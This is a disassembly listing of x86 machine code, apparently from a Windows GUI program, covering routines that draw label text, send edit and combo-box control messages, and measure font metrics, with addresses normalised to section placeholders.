mov eax [ ebx + 0x208 ]
call sub_41d2b4
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_42cb50
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_42cef2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41d358
call sub_429004
call sub_4290e4
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41d2b4
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_438a40
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_412378
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412378
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_438a40
mov eax [ ebp - 0x54 ]
call sub_404250
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_438a40
mov eax [ ebp - 0x58 ]
call sub_404450
push eax
mov eax edi
call sub_41d438
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_412378
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41c9b0
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41c9b0
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d050
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41c9b0
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41d438
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cef9
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403fb4
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403fb4
lea eax [ ebp - 0x60 ]
call sub_404670
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403fb4
retn
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d050
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_438a40
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_438a40
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41d298
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_412378
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_412378
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_438a40
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4047bc
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41d438
push eax
call sub_429004
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42924c
jmp r-xdata
call sub_429004
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_4292b0
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41d438
push eax
call sub_429004
lea ecx [ ebp - 0x4c ]
pop edx
call sub_4291a0
push 0x0
mov eax edi
call sub_41d438
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_438a40
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_43ad20
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_438a40
mov eax [ ebp - 0x80 ]
call sub_404250
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_438a40
mov eax [ ebp - 0x84 ]
call sub_404450
push eax
mov eax edi
call sub_41d438
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41c9b0
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_438a40
mov eax [ ebp - 0x88 ]
call sub_404250
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_438a40
mov eax [ ebp - 0x8c ]
call sub_404450
push eax
mov eax edi
call sub_41d438
push eax
call DrawTextA
sub_42cf03
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42cf7e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_438a40
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44f74c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43e6ac
mov eax ebx
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov eax ebx
call sub_43f788
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf85
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_42cfd0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440470
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_4381fc
mov edx 0x11
mov eax esi
call sub_438220
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_429004
call sub_4290e4
test al al
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_42d07c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42d1d2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43ad20
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41d358
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404258
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404250
push eax
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
mov eax [ ebx + 0x160 ]
call sub_41d438
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c1e4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404250
push eax
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
mov eax [ ebx + 0x160 ]
call sub_41d438
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c1e4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404250
push eax
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
mov eax [ ebx + 0x160 ]
call sub_41d438
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d1d9
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_42d1e3
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_42d40c
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41cacc
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41c9b0
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41cacc
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41d014
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403454
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403454
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_42d304
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41d4b8
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403454
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41d4b8
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403454
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_435820
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_42d448
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42d40c
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42d4a8
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403454
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42d4d0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_437f10
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_42d534
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42d5c1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d5c8
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_438a40
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44f74c
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_42d618
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43af54
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_4381fc
mov edx 0x19
mov eax esi
call sub_438220
mov dl 0x1
mov eax esi
call sub_43f45c
xor edx edx
mov eax esi
call sub_438c04
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_42dd28
mov eax esi
test bl bl
je r-xdata
sub_42d6c0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42d740
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_43f52c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_42d784
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_43f52c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_43f228
push eax
call SendMessageA
test eax eax
setne bl
sub_42d7bc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43f52c
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_43f228
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42d7f4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42d871
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d878
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_43f52c
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_43f228
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_438a40
mov eax [ ebp - 0x4 ]
call sub_404450
mov edx eax
mov eax ebx
call sub_438a1c
sub_42d87c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_43f52c
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_43f228
push eax
call SendMessageA
sub_42d8b8
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43f228
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_42d8dc
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42d8fc
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43f228
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42d92c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43f228
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_43f228
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_42d9c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4389b4
inc eax
call sub_408528
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42da52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_40853c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4389c4
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4083a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42da59
mov eax [ ebp - 0xc ]
call sub_408574
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_42da64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_404080
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_4389b4
inc eax
call sub_408528
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42daf2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40853c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4389c4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408574
retn
sub_42db00
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c0b4
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43bfe0
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42dbb9
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_43c3b0
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_43c3b0
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_42dc2c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_42dc6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43c1e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dc72
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_42dc72
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_42d7bc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42dcec
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call SendMessageA
sub_42dcec
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_42dd28
pop ebx
retn
sub_42dd28
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_41c1f8
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_438220
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_42ddf4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_43cda0
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_42de2c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_43f228
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_43f228
push eax
call SendMessageA
sub_42de6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43e840
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_42dcec
mov eax ebx
call sub_43c7c8
sub_42dea0
push ebx
mov ebx eax
mov eax ebx
call sub_43e784
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_42dd28
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_42dee8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43e5dc
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_43f228
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_42d9ac
sub_42df24
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43f52c
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403454
push 0xfffffff0
mov eax esi
call sub_43f228
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_42df5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_440328
pop esi
pop ebx
retn
sub_42df94
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42dffa
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e001
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414378
sub_42e00c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42e030
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
